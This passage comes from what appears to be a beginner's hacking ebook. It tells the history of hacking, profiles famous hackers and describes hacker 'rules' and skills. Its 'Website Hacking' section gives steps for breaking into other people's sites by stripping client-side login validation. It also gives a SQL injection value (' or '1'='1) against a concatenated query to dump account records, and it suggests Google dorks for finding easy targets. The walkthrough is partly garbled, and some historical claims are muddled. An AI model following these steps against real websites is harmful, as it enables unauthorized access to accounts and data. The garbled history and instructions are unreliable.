Technology  is  a  science  of  an  ensemble  of  methods,  processes  and  operations    that  are  used  in  order  to  obtain  a  product  or  a  result  and  as  Francis  Bacon  says,  knowledge  is  already  power  and  technology  is  knowledge so technology is the biggest power of our century, a power gives us a great opportunity to do our daily tasks without putting a big quantity of effort  and  without  running  from  place  to  place  just  to  finish  our  tasks,  technology  gives  us  a  big  palette  of  services  such  as  accessing  any  information  anytime,  anywhere,  getting  into  new  virtual  worlds  based  on  different  domains,  communicate  with  people  from  other  countries  or  continents just with a click, paying bills from home and much  more than  that  Technology is great, of course, and we all love it because it’s making our lives easier and more enjoyable but as any other thing it as long as it has advantages it has also disadvantages because once you put your information on the internet you are exposing your person, your past, present and maybe a  little  part  of  your  future  accompanied  by  your  whole  package  of information that could be accessed by others who break the security rules and  in  that  way  you  can  lose  basically  everything,  but  as  a  rule  that  life inputs if you don’t risk you don’t win. Nowadays, a lot of people steal. Some of the people steal feelings, break others people hearts and lives, some of the people steal physical stuff such as  cars,  bags,  wallets  and  houses  but  are  those  people  the  only  types  of offenders in the world?! The answer is no, they aren’t. There is another type that is growing day by day and this type is represented by hackers. Hackers are  persons  who  are  passionate  and  attracted  by  knowing  everything  in   detail about the cybernetic systems, especially computer systems. Despite the conception that hackers are persons with evil intentions that want to run the world someday by their own conceptions, their passion for details and understanding them most of the hackers have a professional goal and they don’t  use  their  knowledge  to  seek  and  exploit  weakness  in  a  computer system. Hacking is the operation where you need a computer to use in order to get unauthorized access into a system which contains informatics. This kind of definition is losing the most important aspects of a culture that powerfully helped us to make the 21st century, the high technology century. In his version 1.0.0, a hacker was a person full of passion ready to give a new sense to everything around him. His birth was at Tech Model Railroad Club in the 50’s when the computers were way more different than what we have today and the best of them are still meeting at ‘’hacker spaces’’ where they  organize  marathons  of  hacking  where  they  are  collaborating  and interacting with each other to find a modern solution for a problem. In the 90’s, a hacker was a good intentioned person who owns large skills in the domain but as time flies, people started to use ‘’hacker’’ describing an offender nowadays because a part of the hackers after resolving problems they  started  to  use  their  knowledge  in  an  opposite  way,  creating  real monsters who access people’s protected computers and files and this type of hackers are called “Black Hat” hackers also known as crackers and the 90’s basic hacker version 1.0.0 is called nowadays “ White Hat” hackers. So, when you are sabotaging a person’s computer you are basically hacking them. Early  in  1971,  John  Draper  who  was  a  computer  passionate  discovered  a box  of  cereals  for  children  in  which  was  included  a  toy  whistle  that  it’s reproducing  a  2600-hertz  audio  tone  which  was  necessary  to  begin  a telephone line and that marked the moment he started doing phone calls, he ended up being arrested for phone tampering. Six  years  later  Steve  Jobs  and  Steve  Wozniak  both  members  of  the Homebrew Computer club of California were at the beginning of creating one  of  the  biggest  technology  companies  in  the  world  but  before  that,  a   mysterious device has just appeared on the market, it was known as ‘’the blue box’’ and it was created having as a base the discovery from 71’s about generating tones that were helping the people hack into the phone systems. How great ! Just imagine going back in time and taking part at how a big company is taking birth and growing sale by sale. Who ever thought that those boxes will be such a worldwide success?! I think no one.  The History of hacking  Looking  back  to  the  86’s  when  hacking  was  officially  a  crime  due  to  an organized  congress  where  Computer  Fraud  and  Abuse  Act  and  the Electronic  Communications  Privacy  Act  agreed  that  it’s  a  crime  to  ‘’ violate’’ computer systems. Two years earlier Eric Corley started a business with a magazine called “2600:  The  Hacker  Quarterly”  where  he  was  publishing  about  telephone and computer hacking and this magazine it began in short time a guide to the hackers. Only  one  year  later,  the  people’s  systems  of  communications  and  their telephone networks were very close to a possible end of technology back then, a big damage that had to affect the whole nation was nearly made by Herbert  Zinn  who  was  living  in  Chicago  also  known  by  the  nickname  of ‘’Shadow Hawk” hacked from his bedroom the AT&T’s computer network and broke in the system, after that he’s got arrested at only 17 years old. In  the  same  year  they  discovered  the  first  virus  which  was  called  Brain  known as MS-DOS affecting the computer’s system and it was released on  the internet and the unlucky owners of the virus had a ‘’special file’’ created  on  their  hard  drive  that  was  giving  their  contact  information  for  “  Brain  Computer Services” which was located in Pakistan.   A big shot came in 1988 when a student released the first self-replicating virus that can affect over 6000 systems and the big problem was with this virus because it was shutting down the network system for about two days. It was specially designed to hack security holes in the UNIX systems, this virus  was  invented  by  Robert  Morris  who  graduated  from  Cornell University before he released the virus.   After the big shot with only two years, The Electronic Frontier Foundation is  taking  birth  and  it’s  major  goal  was  protecting  and  taking  care  of  the rights  of  the  people  which  were  accused  of  computer  hacking.  Also, "Legion  of  Doom"  which  were  four  members  forming  a  band  in Southeastern  United  States  are  getting  into  the  network  and  computer systems of BellSouth's 911 emergency stealing technical information that could affect the 911 service in the United States and they ended up by getting arrested. The  Secret  Service  cooperated  with  Arizona's  organized  crime  unit developed Operation Sundevil, a big national project having as goal hunting down the computer hackers. What a year! Gulf War was also affected by hacking culture; a group formed by Dutch Teenagers broke into the computer network in 1991 and got unauthorized access  getting  important  information  about  the  war  and  its  plan  of operations  and  personal  information  about  the  militaries  who  were participating  and  some  exact  numbers  about  the  military  equipment  that was sent to Persian Gulf. Hackers represented a major problem in that piece of  time  because  by  hacking  they  were  able  to  make  history  by  changing military  operations  plans  and  by  making  public  some  of  the  top-secret documents. As  the  Gulf  War,  NASA  and  the  Korean  Atomic  Research  Institute  got hacked by two teenagers known as "Data Stream" and "Kuji" broke into a big number of computer systems directed by the two institutions and after long  time  researches  some  detectives  from  Scotland  Yard  got  the  two hackers  that  were  so  affected  emotionally  and  ended  up  crying  when captured, they turned the whole mission into a big drama mixing feelings and emotions with skills and knowledge. Even the British Queen got hacked! and many important persons form the British  government  such  as  Prime  Minister  John  Major  and  important military commandants under secret missions got hacked by a employee at British Telecom who hacked a computer network which contained all the above  people  numbers,  the  numbers  were  posted  on  the  internet  after  the discovery and the hacker got caught by Secret Services in cooperation with Police. The Citibank got a massive damage caused by hackers in 1995 when   Vladimir  Levin  got  illegally  using  his  own  laptop  in  Citibank’s  computer network  where  he  started  to  transfer  big  sums  of  money  to  different accounts around the world that were supposed to be his accounts and the exact number of money stolen and transferred is still a mystery today but it’s estimated between $3.7-$10 million, after this big shot he’s got arrested in  Britain  with  a  punishment  of  3  years  in  prison  and  an  order  to  pay Citibank $240,000. According to a report released by The General Accounting Office, 250,000 times only in 1995 hackers tried to get illegally into Defense Department files  which  included  precious  data  and  documents,  65%  of  the  attendants already succeed. Hackers were at every step, CIA’s agents noticed a major change applied to the  website  made  by  a  group  of  hackers  known  asSwedish  Hackers Association  who  changed  the  organization’s  name  into  "Central  Stupidity Agency." 1997  represented  an  important  year  in  Hacking  History,  the  first  hacking  program  was  released  with  the  name  of    "AOHell",  for  few  days  AOL  network  was  put  on  pause  and  hundreds  of  thousands  of  users  were  founding in their e-mails multiple-megabyte messages also, chat rooms got invaded by a bunch of ‘’ spam’’ messages. The Symantec AntiVirus Research Center which was the head of security and antivirus software gave the nation a report telling us that they are more than  30,000  computer  viruses  free,  traveling  and  circulating  without  any restriction in the Virtual World. As any other domain, aviation is also based on  technology  and  the  use  of  computers  are  at  every  step  even  in  the  air where there are three computers on each plane’s board and each of them is communicating  with  other  computers  that  belong  to  the  air  traffic controllers, without technology aviation would be 80% dead. For the first time in aviation bright history, in 1998 aviation’s got the first massive attack from hackers, Bell Atlantic airport communications system in Worcester, Massachusetts got hit down by a hacker which caused a big damage  by  interrupting  the  communications  between  airplanes  and  the airport  for  more  than  six  hours  but  happily  there  were  no  accidents.   Information shared with the public are telling us he’s a boy but they aren’t giving any other personal information such as name and age. Hacking can be dangerous for the Black Hat hackers and it can bring them the death, in the same situation were in 1998 three teenagers, two of them form Cloverdale, California and the third of them which was the head of the group, an Israeli teenager known as "The Analyzer” got a sentence to death by a court in China after breaking into computer network systems belonging to federal agencies and banks. E-bay  was  highly  affected  in  1999,  exactly  in  March  by  hacking  when  a hacker  known  as  MagicFX  breaks  into  the  site  destroying  the  site's  front page, the company was so affected because MagicFX was able to change if he wanted to the prices, add inexistent items for sale and redirect the whole online  traffic  to  another  site.  The  Symantec  AntiVirus  Research  Center gives us another report in 2000 estimating that in each hour of the day one new virus is born and left free to circulate in the Virtual World. Love is a great feeling, it’s a free gift from life to us that we could open every day, in every hour and every second but does love only come in this form?  No!  it’s  not  because  there  is  also  an    "I  Love  You"  virus  which showed up in the May of 2000 in Philippines then contaminating the whole world  in  a  matter  of  hours.  Before  any  solution  was  found  it’s  estimated damage about $10 billion lost files worldwide, how tricky love could be if you don’t protect yourself. Later  in  2001  in  May,  the  several  U.S.  government  sites,  Department  of Health  and  Human  Services  and  the  Central  Intelligence  Agency  were hacked by couple groups of Chinese hackers causing information lack and modifying data. In the same month, Microsoft websites got interrupted by attacks from DDOS-distributed denial-of-service.  Best Hackers of All Time  Despite the rich and diverse culture, as any other domain, hacking owns a top of hackers who made the biggest hacks in the world, and it’s hard to be on  top  because  there  are  millions  of  hackers  but  only  the  best  skilled  of them succeed, the rest are just a part of people used to make the successful hackers  shine  even  more.  In  fact,  being  successful  is  not  even  a  goal;   successful people are people who do everything with passion and hard work no matter how hard the situation is and success is a collateral effect you get, not a goal. Gary McKinnon was born on 10 February  1966  in  Glasgow,  Scotland,  he has always been curious and passionate about computers and informatics, which is totally great if you follow your dream in this domain of science. Gray  is  living  right  now  in  London  and  he  is  known  as  a  hacker  for  the operation he did in 2002 called "biggest military computer hack of all time" when he used to put down the US Military’s Washington Network of about  2000 computers for 24 hours and that’s how he received the title of “The  biggest hacker of all time”, his curiosity strongly made him to break into  NASA’s  computers just to get information  on UFOs, he wanted to make  sure that he is getting it right from the source. He illegally accessed 97 US  Military and NASA computers by deleting a couple of files and installing a  virus. Everything he made was just to satisfy his curiosity. The whole hack  was from  his  girlfriend’s  aunt’s  house  in  London  using  the  name  “Solo”. More  than  that,  after  hacking  he  posted  a  message  on  the  US  Military’s website saying “Your security is crap.” And continued hacking but at the end  he  admitted  that  he  left  a  threat  on  one  computer  after  another  hack saying “US foreign policy is akin to Government-sponsored terrorism these days … It was not a mistake that there was a huge security stand down on September  11  last  year  …  I  am  SOLO.  I  will  continue  to  disrupt  at  the highest levels … “. Right now, Gray is happy with his title and by following his dream he is more than pleased working as a system administrator, a great example of a man who is happy because he followed his dreams. LulzSec  or  Lulz  Security  is  an  important  group  of  hackers  due  to  their realizations,  they  are  a  group  with  eleven  members  and  seven  volunteers   and they are doing high profile attacks.  Their  motto  is  "The  world's  leaders  in  high-quality  entertainment  at  your expense",  "Laughing  at  your  security  since  2011"  and  their  main  goal  is showing the gigantic companies their lack of security and absence of taking care  of  their  personal  data.  They  hacked  Sony,  News  International,  CIA, FBI,  Scotland  Yard,  and  several  noteworthy  accounts  to  show  them  how   they  can  play  with  other  people’s  information.  By  hacking,  they  were having lots of fun and a demonstrative attack is when they broke into News Corporations account posting a report about the death of Rupert Murdoch on 18 July 2011 which was totally fake. Also, they have created an ASCII graphic used by them in its Chinga La  Migra torrent, here’s how the graphic looks like:   .  $$   $$ $$$$$$ . $$  $$   $$__  $$ . $$  $$ $$ $$  $$$$$$$$ $$  \__    $$$$$$ $$$$$$$ . $$ $$   $$ $$____  $$   $$$$$$   $$__  $$  $$_____  . $$ $$   $$ $$ $$$$   \____  $$ $$$$$$$$ $$ . $$ $$   $$ $$   $$__  $$  \ $$ $$_____  $$ . $$$$$$$$  $$$$$$  $$  $$$$$$$$  $$$$$$   $$$$$$$  $$$$$$.$ .________  \______  __ ________  \______   \_______  \_______      Laughing at your security since 2011!  Another important figure in hacking world is represented by Adrian Lamo; he  was  born  on  February  20,  1981  in  Boston,  Massachusetts  and  he  is mixed  race   Colombian-American he  is  known  as  a  former  hacker  and threat analyst. Lamo doesn’t own a high school diploma and he was often called  “Homeless  Hacker”  because  he  loved  to  surf,  travel,  explore abandoned buildings and go to the internet cafes, libraries and universities to  discover  network  and  look  after  details,  exploiting  security  holes  was always a hobby for him. Lamo  first  got  media  attention  when  he  decided  to  change  careers  and realized  his  skills  in  hacking.  He  hacked  big  companies  such  as  Yahoo!, Microsoft, Google, and The New York Times and in two thousand and three he’s got his first arrest. In the prison, he studied and after getting free he’s got a batch of an American Threat Analyst which allows him to break into accounts  sitting  is  spacious  places  such  as  cafeterias.  Lamo  is  one  of  the biggest examples showing us that school is not learning you everything and the  main  problem  of  school  nowadays  is  the  big  amount  of  information   school is giving to the students in different domains in order to let students choose a domain they love and specialize only on it. Number four in this top is taken by Mathew Bevan and Richard Pryce, two hackers which case is similar to Gray’s case. Mathew Bevan was born in June 10, 1974 and he is a British Hacker born in Cardiff, Wales he’s got his first sentence and arrest in 1996 after breaking into secure U.S government network protecting himself with the nick name “Kuji”, Mathew wasn’t very good at school and he used the internet to escape form the real life, in this way he formed a double life, the first one with ordinary activities at day and the  second  life  with  night  activities  based  on  computers  and  networking. Mathew Bevan and Richard Pryce created many damages between United States  of  America  and  North  Korea  as  they  used  to  hack  the  Military  Us computers and installing on them foreign and strange systems. The contents of Korean Atomic Research Institute were dumped into USAF system.   Jonathan  Joseph  James   December  12,  1983  –  May  18,  2008   is  an American hacker from North Florida and he is the first juvenile in prison due to a cyber-crime he did at age of 15. His action name is “c0mrade” and he broke into Defense Threat Reduction Agency of US department and he installed  software  though conversations  between  the  employees  of  DTRA  and  he  also  collected  the user names and passwords and other details of employees. More than that, he  stole  important  software.  NASA  paid  from  its  wallet  41,000$  to  shut down its system. Jonathan ended his life committing suicide in 2008. Number six is Kevin Poulsen and his hack story is the funniest so far. Kevin Lee Poulsen  born November 30, 1965  was born in Pasadena, California and  he  is  a  black  hat  hacker  because  he  used  his  skills  to  get  one  of  his interests true, he is currently working as a digital security journalist. Would you do anything to follow your dreams? In his case the answer is yes, so from dream to practice was only a step and he made this step by hacking a radio show powered by Los Angeles radio station KIIS-FM, the game rules were so simple, the 102nd caller will win a prize of a Porsche 944 S2 and Kevin wanted to make sure that he will be the lucky caller so he hacked into their phone line. Known as “Dark Dante” he went underground when FBI  the  messages  passed  on   that  controlled    started to follow him but he was caught and arrested with a sentence of five years. And no one knows what happened with the car. Kevin  David  Mitnick  was  born  on  6  August,  1963  in  Los  Angeles, California, he was called once as ‘’the most wanted cyber-criminal of US, but time and work transformed him into a successful entrepreneur. Kevin is also  an  important  hacker;  he  broke  into  Nokia,  Motorola  and  Pentagon. He’s got media attention when he was arrested in 1999 and 1988, he had two  hack  names  “The  Condor,  The  Darkside  Hacker”  and  after  spending five  years  at  the  prison  he  opened  a  security  company  named  Mitnick Security Consulting. At the age of 15 he showed his interest to social engineering and he started to collect information including user name, passwords and phone numbers. Nowadays, he is working as a computer security consultant but in the past he used to work as a receptionist for Stephen S. Wise Temple. Number eight is taken by Anonymous, one of the most popular moves from the last years, the group was born in 2004 on the website 4chan, it’s more an ideology and it represents a concept in which few communities of users exist  in  an  anarchic  society  and  they  are  fighting  for  internet  freedom against big corporations. The members are wearing Guy Fawkes masks and they  are  attacking  religious  and  corporate  websites  in  special.  They  have targets  such  as  The  Vatican,  the  FBI,  and  the  CIA,  PayPal,  Sony, Mastercard,  Visa,  Chinese,  Israeli,  Tunisian,  and  Ugandan  governments which they almost touch. Many of the members wish to control the Virtual World someday. Astra is the cover of a Greek mathematician who is 58 years old and it’s well known due to the damage Astra caused to the French Dassault Group in 2008. Astra hacked into their system and stole weapons technology data and  for  five  years  Astra  sold  the  data  to  five  countries  around  the  world. Official sources say that he had been wanted since 2002.  Astra’s happiness  meant Dassault sadness because the damage caused to Dassault was about  $360  millions  while  Astra  was  selling  data  to  more  than  250  people  all  around the world.  And  the  last  place  in  this  top  is  taken  by  Albert  Gonzalez,  an  American computer  hacker;  I’d  call  him  The  Master  Hacker  of  internet  banking   because he stole more than 170 million credit cards and ATM numbers in  the  period  2005-2007.  He  is  originally  born  in  Cuba  in  1981  but  he  immigrated to the USA in 70’s and he’s got his first computer at age of  8.  After many attacks he’s got arrested on May 7, 2008 and got a sentence of 20 years in Federal prison.     CHAPTER 2: HOW TO BECOME A HACKER  A Hackers Style  Hackers are people who enjoy their activity both mentally and practically, they are problem solvers and new software builders, they are confident and believe  in  volunteer  work  and  freed0m,  one  of  their  basic  rules  that  we should also adopt practically and not just theoretically is helping each other when it’s needed, yes, hackers help their mates whenever is needed. To be accepted  in  the  world  of  hackers  it  depends  only  on  you,  depends  in  the biggest  part  on  your  attitude.  Hackers  try  to  understand  every  piece  of  a problem and then find or create the best solution, the motivation of being a hacker should come from your inside without any influence because the one who is going to be in the situation is you, and no one else. Being an original good hacker is a mind-set. But in the community of hackers there are a few rules to respect, and here they are: The  first  rule  is  about  your  connection  with  the  world,  in  the  real  world problems  can’t  be  stopped  and  you  have  to  think  about  the  solution  for every problem and strongly believing there is a solution for every problem, and  if  there  is  not  you  should  create  one.  Hacking  world  is  absolutely fascinating once you discover it and you understand it and for a hacker this world  should  be  the  only  one,  hackers  have  tons  of  fun  by  doing  their activity but no one tells about that kind of fun, is the kind of fun where you have to work and put a lot of effort by exercising your own intelligence in order  to  succeed.  As  a  hacker  you  should  rather  resolve  a  problem  than complaining about having a problem, hacking is in fact a lifestyle. The second rule is a matter of perfectionism; you should believe that once  you solve a problem there is no need to do it again because you already did  it in an ideal way. Jumping into solution isn’t a solution; you have to think  at least twice before you get in action.  To behave like a real hacker you  should  not  waste  time  on  finding  two  solutions  for  the  same  problem,  remember?  There  are  a  lot  of  problems  that  needs  to  be  solved.The  third  rule  is  telling  us  about  the  evil  work  and  boredom,  they  could  seriously  affect your activity as a hacker so they are categorized as being evil. One of    the best ways to lose the contact with evolution and innovation is to become  repetitive. A hacker is always creative and ready to build new stuff and if you are assaulted by boredom it means that you are not doing your job as you  were  supposed  to,  while  breaking  the  first  two  rules.  Freedom  is  the best, that’s the fourth rule; everyone loves freedom more than anything but they realize only when they loose it. Hackers don’t have a boss, hackers are their  own  leaders  and  it  depends  only  on  their  person  if  they  want  to progress or not, but if we’re talking about a real hacker then he will always be in a bubble that’s growing. Leave borders somewhere far, you have to be very  open  minded  in  order  to  be  a  real  hacker  which  means  you  should accept new concepts and ideas and work to realize them, you should make your own rules, a set of rules which is going to improve your creativity, a set of rules that should allow you to do whatever you want and whenever you  want.  Listening  to  orders  must  be  excluded  from  the  start;  the  main idea  is  about  resolving  problems  with  your  own  concepts.  What  are  you going to achieve if you are listening to others ideas? Nothing. It’s worse if you practice their ideas, so be free as a bird in the sky. Attitude can’t hide the lack of competence; this is the last rule you should respect. To behave like a hacker you should have a compatible attitude but don’t forget about the competence and the skills! An excess of attitude is not going to turn you into  a  real  hacker,  is  going  to  turn  you  into  a  celebrity  or  a  champion athlete. Hard work is the ultimate key of success that will help you open doors  in  the  world  of  hackers,  for  being  a  hacker  is  needed  to  have intelligence, practice and it requests a lot of concentration, also you must be 100% dedicated. Those  rules  are  going  hand  by  hand,  and  if  you  broke  one  rule  you  are going to break them all. Respect is the priority, it all starts and ends with you, if you really respect yourself then you should respect your choices as well. I think those rules are a solid base for any successful person and respecting them  would  guide  into  a  bright  society  with  responsible  people. Unfortunately,  we  have  to  create  communities  and  smaller  versions  of societies  because  there  is  a  very  limited  number  of  persons  who  respect rules. Idealism doesn’t come in big sizes. Differences between people are meant to be, strong people help wear people realize how incompetent they   are, poor people make rich people feel even richer, unhealthy people make healthy people their luck and vice versa in each of the above, that’s how the world works …..  General Hacking Skills  When you build a house, you should have a strong base; it’s the same if we are talking about hacking. You need a base in hacking too so there are few hacking skills that are basic skills and I am going to present them to you: First of all, you should know how to program and if you don’t know you should learn as fast as possible because that’s in a hacker’s basic package. Programming is the main skill, if you are a beginner and you don’t know what a computer language is about then stat using Python, it’s very good for beginners  because  everything  in  Python  is  so  clear  and  it’s  very  well  documented, I’d personally say it was designed 50% for beginners due to  the simplicity you can work with.   You can find helpful tutorials at Python web site https:  www.python.org . After  learning  some  basic  programming,  you  will  progress  and  I recommend  learning  how  to  work  with  C,  the  core  language  of  UNIX, further more, if you know to work with C it would not be complicated to work with C++ because they are very close to each other. There are other programming languages that are important to hackers such  as Perl or LISP. Perl is the best option if you love practice work despite this,  Perl is used a lot for system administration.  LISP is harder to understand  but  once  you  get  it  you  will  be  very  proud  of  yourself  and  experienced  because it will definitely help you to be a better programmer.  Actually, only knowing the programming languages is not enough because you should exercise with your self to think about programming and solving the problems in a big way without a lot of time needed. Programming is not an easy skill so you have to write and read codes and repeat them until you get a certain meaning.  Learn everything about HTML  HTML  is  the  Web’s  markup  language  and  it  means  Hypertext  Markup Language, it’s very important because you learn practically how to build a   web page from 0 and it’s helping a lot if you are at the start of programming because it’s codes will run your mind. Writing in HTML definitely opens your horizons and makes you think even bigger than before. What I love about HTML is that you are able to create anything, you can write, you can create images and forms as you like only by knowing the codes.  English language is a must  This is an international key of communication, everything has an English version too even if it’s not the mother language in the country. If you are not sure about your English skills, you should make them at least perfect  as  fast  as  you  can  because  English  is  main  language  in  hacker culture and on the internet. Studies show that English has the biggest and richest technical vocabulary than any other language of the globe. Grammar is the key to open the English world. Go for it !  Learning computer networking  Because  you  are  definitely  going  to  break  into  websites  and  network resources, it’s a very important and useful skill because there are a lot of ways  to  hack  a  website  but  it’s  all  depending  on  the  server  and  on  the technology that the site uses such as ASP.net, PHP, etc. There  are  sites  specially  designed  for  hackers  which  will  take  you  on  a long road from SQL injection to XXS attacks, just to make sure you have learned everything.  Learn UNIX and Linux  UNIX represents the operating system on the internet and if you don’t want to be a hacker this is not a must, but if you are going to be a hacker you should learn and understand it. Linux is another computer operating system and you can get very close to it by downloading and using it on your own machine. To  get  a  great  experience  in  programming  and  also  good  skills  run  the systems,  understand  them,  read  the  codes,  modify  the  codes  and  do  it  all over again and don’t forget to have fun while learning.   So, those are some general hacking skills and if you are going to take care of them and put them in practice you should become a hacker.  Why Do People Hack?  One of the frequent question when it comes about hacking is why do people do it and there is a big palette of reasons about this subject. Many people ask this question without even knowing what a hack is about. Some  hackers  hack  just  for  having  fun,  they  break  into  websites,  servers and  network  systems  for  their  entertainment,  other  hackers  do  it  because they  like  to  be  in  the  center  of  someone’s  universe  and  they  get  there  by hacking  into  different  stuff  and  they  can  do  it  also  to  prove  someone something  at  a  moment  of  their  experiences  as  hackers.  They  also  enjoy doing it because it’s like a mind puzzle where you are free to put any piece as  you  want  but  you  know  it  has  to  work  and  that’s  why  hackers  find  it extremely  satisfying  to  hack.  Hackers  are  also  entertained  by  spying  on friend and family and why not on business rivals. There  are  hackers  who  hack  a  system  just  to  get  valuable  information, others are interested in stealing files or services in order to sell them later and get money on it and a big part of hacking adepts are in this category. Many  of  the  hackers  are  powered  by  their  own  system,  they  could  be  powered by curiosity, and they are very curious about new systems and very  interested  in  updates  and  IT  stuff.  Many  of  the  curious  hackers  work  for  companies especially to probe their computer systems by hacking them and  then they inform the system administrator about the weakness to help him  improve his security.   Money is another reason for hacking; some of the people become hackers just  to  be  able  to  make  money  form  hacking  techniques  such  as  gaining entry to servers that contain credit cards details. Your computer may be hacked if you notice that a big amount of memory is taken,  hackers  also  hack  to  use  other  computers  in  activities  such  as depositing pirated software, pirated music, pornography, hacking tools etc. They can also use your computer as an internet relay or as a part of a DDoS attack.   An  important  reason  is  disrupting,  some  of  the  hackers  break  into  target companies to disrupt the big business just to create chaos and to show them their  absence  of  taking  care  about  security,  most  hacks  of  this  type  are powered  by  hacker  groups  such  as  LulzSec.  Scientists  say  that  hackers might have a disease known as Asperger Syndrome  AS  and the victims are  people  who  aren’t  good  at  social  relationships  but  own  a  special capacity to focus on numbers and hard problems for a long time. Most of the times hackers are categorized as challenge lovers and hacking has  a  strong  connection  with  challenging  because  basically  when  you  are hacking you are challenging yourself to try new things, to solve the most complicated problems and if you will succeed once you won’t stop, because that is what is hacking about, so you are always putting yourself in front of intellectual challenges. Those  are  the  most  common  reasons  that  are  determining  people  to  hack and their interior power is helping them to transform into real hack masters. There  are  people  who  hack  for  their  personal  interests  just  like  Kevin Poulsen  who  got  his  dream  car  by  hacking  and  of  course,  there  are  still unknown reasons.       CHAPTER 3: TYPES OF HACKING In every country on the globe you will find an own culture, lifestyle, food style, traditions and people and there will never be two countries with the same culture or traditions because those are the main features that makes a country  unique.  You  will  meet  in  your  life  different  types  of  people,  you will meet pacifist people, quality people, low quality people and the list can continue,  it’s  the  same  if  we  take  a  second  and  think  a  little  bit  about hacking, there are different types of hacking and each type specializes and focuses  on  something,  there  are  different  goals  hackers  to  reach  in  every type of hacking. In the end you can categorize people by types, hackers do exactly the same in  their  world,  and  they  categorize  types  of  hacking.  I’d  say  that  types created by reasons and once we know the reason we can categorize a hack. There are seven big types of hacking, the first one is website hacking and it’s usually used to hack into big brands  companies websites. The second type of hacking is password hacking and hackers do it in this case to collect information or get access to an important document and others do it just for fun powered by curiosity, next type of hacking is called computer hacking and  it  happens  when  a  hacker  is  controlling  your  machine  without  your permission. Network hack attacks are growing since 2003, usually hackers break into a network to disrupt and cause chaos, the fourth type is email hacking and it’s powered by people curiosity about you, about your activities and hackers might sent emails with your name pretending they are you, another type of hacking is the ethical hacking and it’s used when a big company wants to discover their security threats on a network, system or even on a computer. And  the  last  type,  and  the  most  serious  of  all  is  internet  banking  hack, people  who  usually  perform  this  type  of  hacking  aren’t  real  hackers powered by skills, knowledge, challenges and curiosity, they are powered by lack of money and that’s why they become “hackers”, just to get their bank accounts full taking benefit from others bank accounts.  Website Hacking   Websites  are  open  doors  to  the  world  of  information  and  technology, billions of people use them daily to make their life easier and a lot of people do their activity on websites. Website hacking means to take authority from the authorized person, which means that you are controlling the website and after you break into the website you will be able to do some activities such as  posting  messages  to  the  site,  modify  the  interface  of  the  website  and  basically  change  anything  you  want  on  that  website  but  you  have  to  remember that it depends from website to website and that is due to their  systems in use. You can become a website hacker if you have knowledge  about HTML and JavaScript at a medium level and with some exercising  you can become a real pro in website hackings because there are a lot of  low-secured websites you can break into using HTML.  This is the kind of  simple attack you can make because websites with complex security details  won’t give up in front of this method, but I highly recommend starting with  this kind of website hacking because it’s one of the easiest ways you can  hack a website.  So,  if  you  choose  this  method  you  should  before  anything  else  open  the website you want to hack and enter a wrong combination of user name and password   ex  username:  You,  password:  1=1  or  “and  ‘ ,  after  that  the website  will  deliver  to  you  a  message  saying  there  is  an  error  and  the operation can’t be performed, get ready to handle the fun now. Click right in any place on that page which shows you there is an error and then select go to view source option and the website will let you see the source code, there is where the magic happens because you can the HTML coding with JavaScript and it will appear something like   but before this log in information don’t forget to copy the URL of the site you want to hack. Step four needs a small quantity of attention because you need  to  be  very  careful,  all  the  hack  operation  depends  on  this,  and  you should  efficiently  remove  the  java  script  code  that  is  validating  your information  in  the  server.  After  this,  you  must  give  a  look  to  <_input name="password"  of    this  code     and  check  out  if  maximum length of password is smaller than 11 and if it is increase it to 11 after doing this  you  must  go  to  file,  select  save  and  save  it  where  you  have  free memory on your hard disk using the extension “.html”   ex.: c:\eleven.html  type="password">   place   and   put   in     , move to the next step by double clicking the file you just made on your hard disk recently and this will reopen your target website , don’t get scared if you will notify some changes in comparison with the original page. After doing the entire steps please make sure you made it in the right way and enter the target website and provide any user name and password. Congrats! You have just cracked your target website and broke into the account of List  user saved in the server's database.   There is another method used by hackers to break into a website and it’s called Injection Attack, an injection attack is taking place when there are defects in your SQL libraries, SQL Database and sometimes it could be the operating  system  itself.  Employees  usually  open  apparent  believable  files which  are  containing  hidden  commands  and  injections,  without  knowing this. This is the way they let the hackers get unauthorized access to private information just like financial data, credit card numbers or social security numbers.  I  am  going  to  show  you  an  injection  attack  example  below: Injection Attacks could have the next order line String query = “SELECT * FROM accounts WHERE custID='” + request.getParameter  “id”  +”‘”; to make  the  hacking  operation  succeed  you  change  the  ‘id’  index  in  your browser to send ‘or ‘1’=’1 and in this way you will return all the records from the accounts database to you. Of course there are other methods you can use to hack a website such as Portal  Hacking   DNN   Technique;  this  method  also  takes  advantage  in Google  search  engine  to  find  easy-to-hack  websites.  If  you  choose  this method you should remember that here you can hack a website only using Google Dorks or attempting to a social engineering attack which happens when you give information to “trustable sources’’ like credit card numbers or via online interactions such as social media sites and emails and the hack is happening when you get into what you don’t expect to get into. Another way hackers break into a website is a DDoS attack- A Distributed Denial of Service attack is when you try to make a service unavailable by accessing it from multiple sources generating a big traffic, it’s like taking the water from you when you are in the middle of the desert where you need it most. The hack  could  be  temporally  by  making  the  website  inaccessible  for  a  short period  of  time  or  it  could  be  a  hack  that  shuts  down  the  whole  running system.  DDoS  attacks  are  made  by  delivering  a  big  number  of  URL   requests  to  the  target  website  in  the  shortest  time  possible  and  this  is causing a CPU run out of resources which is the result of bottlenecking at the  server  side.  Cross  site  scripting  attacks,  Cross  site  request  forgery attacks and Clickjacking attacks are used by hackers usually to reach their goal.  Ethical Hacking  As I mentioned, respect is very important in the virtual world because it’s one  of  the  basic  features  for  a  good  collaboration.  If  you  are  going  to respect yourself, your customers and everything around you it’s impossible to  not  get  success.  Serious  business  organizations  and  companies  respect their jobs and their customers and security is a priority for them especially in  the  virtual  world  and  that’s  why  they  employee  ethical  hackers,  those hackers  belong  to  ethical  hacking  type  and  they  are  also  known  as penetration  testers.  Ethical  hacking  is  about  high  standards  security systems,  hackers  are  trying  to  find  flaws  and  weakness  in  a  system  by trying to hack it and those hackers are helping their employers to test and fix their applications, networks and computer system. Ethical hackers main goal is to prevent crackers and black hat hackers get into the system they are testing. By adopting this kind of hacking you are combining business with pleasure because you are exposing yourself to big challenges and more than that you are also paid for doing it, what could be better? It’s right that you won’t get the same adrenaline portion you get in case you are not on ethical hacking but  hacking  in  this  way  protect  you  from  prison  and  it’s  making  you  an honest  person.  However,  you  need  experience  in  IT  to  get  in  an  ethical hacker position and a lot of work behind you because you can’t just jump in and  become  an  ethical  hacker  as  many  people  believe  because  you  will need  IT  security  degrees  and  certifications  and  without  experience  it’s impossible to get them. If you want to start as an ethical hacker you need to follow few steps: First, I have to inform you that it depends on the field you are studying in IT but you should start with the basics and get your A+ Certification and earn a tech support status and don’t forget that some experience is always welcomed so it’s better to have additional certifications such as Network+   and  